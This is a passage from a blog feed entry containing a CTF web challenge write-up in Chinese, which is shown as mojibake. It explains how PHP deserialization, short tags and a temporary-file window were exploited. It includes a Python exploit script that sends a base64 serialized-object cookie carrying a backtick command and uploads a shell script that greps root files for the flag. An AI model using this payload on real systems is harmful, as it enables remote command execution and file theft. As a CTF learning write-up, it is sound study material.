scriptï¼Œä¾‹å¦‚<code>./tmp/hello.sh</code>ï¼ˆä½†åœ¨å®é™…æ“ä½œä¸­å‘ç°è¿™ä¸ªå¥å·æ‰§è¡Œéœ€è¦æƒé™ï¼Œä¸èƒ½ç›´æ¥æ‰“äº†å°±æ¥ï¼Œå¯èƒ½æ˜¯æœåŠ¡ç«¯å·²ç»è®¾ç½®å¥½äº†ï¼Œæ‰€ä»¥æ‰èƒ½æ‰§è¡Œï¼‰ï¼Œä»¥ä¸‹æ˜¯å¯¹äºshellçš„å¤§è‡´ä»‹ç»</p>  <blockquote>Shell æ˜¯ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æˆ·ä½¿ç”¨ Linux çš„æ¡¥æ¢ï¼›Shell æ—¢æ˜¯ä¸€ç§å‘½ä»¤è¯­è¨€ï¼Œåˆæ˜¯ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€<br>  éœ€è¦å…³æ³¨çš„æ˜¯ Bashï¼Œä¹Ÿå°±æ˜¯ Bourne Again Shellï¼Œç”±äºæ˜“ç”¨å’Œå…è´¹ï¼ŒBash åœ¨æ—¥å¸¸å·¥ä½œä¸­è¢«å¹¿æ³›ä½¿ç”¨ï¼›åŒæ—¶ï¼ŒBash ä¹Ÿæ˜¯å¤§å¤šæ•°Linux ç³»ç»Ÿé»˜è®¤çš„ Shell<br>  æ‰©å±•åå¹¶ä¸å½±å“è„šæœ¬æ‰§è¡Œï¼Œshçš„åç¼€å®Œå…¨æ˜¯ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·ç†è§£è¿™ä¸ªæ–‡ä»¶å¤§æ¦‚æ˜¯ä»€ä¹ˆç©æ„å„¿ï¼ŒLinuxæ ¹æ®æ–‡ä»¶å¤´è¯†åˆ«æ–‡ä»¶ç±»å‹ï¼Œä¸éœ€è¦æ‰©å±•å<br>  </blockquote><p>  åªéœ€åŸºç¡€çš„ä¸¤ä¸ªå‘½ä»¤å³å¯å¸®åŠ©æˆ‘ä»¬è·å–flagï¼š<code>cat</code>å’Œ<code>grep</code>ï¼Œ<code>*</code>ä½œä¸ºåŒ¹é…0è‡³ä»»æ„ä¸ªå­—ç¬¦çš„é€šé…ç¬¦ï¼Œä½¿å¾—catè¿”å›å…¨éƒ¨æ ¹ç›®å½•ä¸‹æ–‡ä»¶ä¿¡æ¯</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh\ncat /* | grep flag</span></span><br></pre></td></tr></table></figure></li><li><p>æœ€åéœ€è¦è¾“å‡ºæ‰§è¡Œä¸Šè¿°æ–‡ä»¶åè¿”å›çš„ç»“æœï¼Œéœ€è¦ç”¨åˆ°çš„æ˜¯phpçŸ­æ ‡ç­¾</p>  <center><code>&#60;&#63;&#61;'233';&#63;&#62;</code> ç­‰ä»·äº <code>&#60;&#63;echo '233';&#63;&#62;</code></center></li></ul><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                  echoçš„å¿«æ·ç”¨æ³•ï¼Œä½†é¡»åœ¨php.inié‡Œæ‰“å¼€short_open_tag</span></span><br><span class="line"><span class="comment">#                                          |</span></span><br><span class="line"><span class="comment">#                                          |   å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›</span></span><br><span class="line"><span class="comment">#                                          â†“                 â†“</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:1:&#123;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                                            â†‘</span></span><br><span class="line"><span class="comment">#                                     æ‰§è¡Œåé¢è·¯å¾„ä¸‹çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                æ‰“å¼€æ ¹ç›®å½•ä¸‹å…¨éƒ¨æ–‡ä»¶å¹¶æ˜¾ç¤ºåœ¨æ ‡å‡†è¾“å‡º</span></span><br><span class="line"><span class="comment">#                             |</span></span><br><span class="line"><span class="comment">#                             |   æŸ¥æ‰¾å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">#                             â†“      â†“</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&quot;#!/bin/sh\ncat /* | grep flag&quot;</span>&#125;</span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                 â†‘         â†‘       â†‘</span></span><br><span class="line"><span class="comment">#                 |       æ¢è¡Œç¬¦   pipeï¼Œä»¥å‰é¢çš„è¿”å›ä½œä¸ºå‚æ•°æ¥æ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œç›¸å½“äºåœ¨æ ¹ç›®å½•é‡Œæ‰¾flag </span></span><br><span class="line"><span class="comment">#                 |</span></span><br><span class="line"><span class="comment">#      #!æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¡¨ç¤ºç¬¦ï¼Œå…¶åè·Ÿç€è§£é‡Šæ­¤è„šæœ¬çš„shellè·¯å¾„</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;è€ƒå¯Ÿphpä»£ç å®¡è®¡ï¼Œä¸´æ—¶æ–‡ä»¶çª—å£æœŸçš„åˆ©ç”¨ï¼Œä»¥åŠlinuxæŒ‡ä»¤çš„æŒæ¡ï¼Œå¯¹æˆ‘å¥½éš¾ï¼Œè¿˜å¥½æœ‰@blackWatchçš„wpå’ŒååŠ©&lt;/p&gt;
&lt;p&gt;ï¼ˆæ®è¯´æ˜¯æŸåŸé¢˜æ¬è¿ï¼Œç¢äºé¢˜é‡å¤ªå°‘è€Œæ²¡æœ‰æ‰¾åˆ°åŸé¢˜åœ¨å“ªï¼Œä½†æ˜¯è¿™ä¸é‡è¦&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://kyriota.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
